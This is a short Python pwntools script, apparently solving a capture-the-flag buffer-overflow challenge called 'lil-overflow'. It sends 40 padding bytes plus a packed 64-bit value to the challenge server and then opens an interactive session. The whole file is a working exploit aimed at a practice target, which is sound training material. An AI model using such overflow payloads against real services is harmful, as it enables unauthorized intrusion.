from pwn import *

host = 'lil-overflow.challs.olicyber.it'

port = 34002

r = remote(host,port)

payload = b'A' * 40 + p64(0x5ab1bb0)

r.sendline(payload)

response = r.recvline()
print(response)
r.interactive()


r.close()
